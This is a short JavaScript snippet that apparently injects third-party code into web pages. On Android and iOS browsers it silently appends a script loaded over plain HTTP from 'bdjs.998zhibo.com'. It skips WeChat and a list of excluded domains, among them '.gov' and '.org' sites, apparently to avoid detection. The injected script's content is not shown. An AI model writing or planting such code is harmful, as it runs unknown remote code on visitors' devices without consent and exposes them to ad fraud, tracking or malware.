var myHost = !! (/(ygg.sunpcm.com|m.99wxc.com|push.ppnad.com|180.76.232.29|ssp.tvrom.cn|baidu.wzzjh168.cn|10086.cn|fmcc.com|dd.xjb12.com|kaisafax.com|highflyersef.cn|.org|.gov|sf-express.com|sf.gmta.com.cn|m.tujia.com|m.5i5j.com|m.fang.com|m.iwjw.com|m.lianjia.com)/i.test(document.domain));
var myUA = !! (/(MicroMessenger)/i.test(window.navigator.userAgent));
var ISIOS = !! (/(iPhone|iPad|iPod|iOS)/i.test(window.navigator.userAgent));
var ISAPK = !! (/(android)/i.test(window.navigator.userAgent));

if (myHost || myUA) {} else
{
        if (ISAPK||ISIOS)
        {
	var ads1 = document.createElement('script');
	ads1.src = "http://bdjs.998zhibo.com/bdv2.js";
	document.body.appendChild(ads1);
        }

}